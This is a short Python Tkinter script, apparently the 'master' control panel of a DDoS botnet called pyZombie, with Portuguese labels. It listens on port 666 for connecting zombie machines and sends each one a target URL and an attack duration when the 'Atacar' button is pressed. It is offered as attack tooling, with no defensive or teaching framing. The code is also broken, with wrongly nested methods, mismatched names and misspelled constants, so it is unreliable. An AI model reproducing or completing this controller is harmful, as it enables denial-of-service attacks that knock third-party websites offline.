import tkinter,socket, threading
class Aplicacao:
	def __init__(self, master=None):
		threading.Thread(target=inicia_socket).start()
		self.label= Tkinter.Label(root,text='Vitima')
		self.label.place(x=5, y=5)
		self.vitima=Tkinter.Entry(root,width='20')
		self.vitima.insert(0,'http://')
		self.vitima.place(x=5,y=25)
		self.label=Tkinter.Label(root,text='Tempo')
		self.label.place(x=80,y=50)
		self.tempo=Tkinter.Entry(root, width='5')
		self.tempo.insert(0,'60')
		self.tempo.place(x=125,y=50)
		self.BotaoAtacar=Tkinter.Button(root,text='Atacar',font=('Times New Roman',20), command=self.atacar)
		self.BotaoAtacar.place(x=180,y=10, width=100, height=70)
		def atacar(self):
			for sock in vitimas:
				dados=self.vitima.get() + '|' + self.tempo.get()
				try:
					sock.send(dados)
				except socket.error:
					sock.close()
					del vitimas[vitimas.index(sock)]
			tkMessageBox.showinfo('INFO : ', 'DDoS Iniciado')
		def incia_socket(self):
			sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADOR, 1)
			sock.bind(('0.0.0.0',666))
			sock.listen(1)
			while True:
				client_socket, client_addr = socket.accept()
				vitimas.append(client_socket)
			vitimas=[]
			root=Tkinter.Tk()
			root.geometry('290x90')
			root.resizable('False', 'False')
			root.title('pyZombie - mestre')
			Aplicacao(root)
			root.mainloop()
Aplicacao()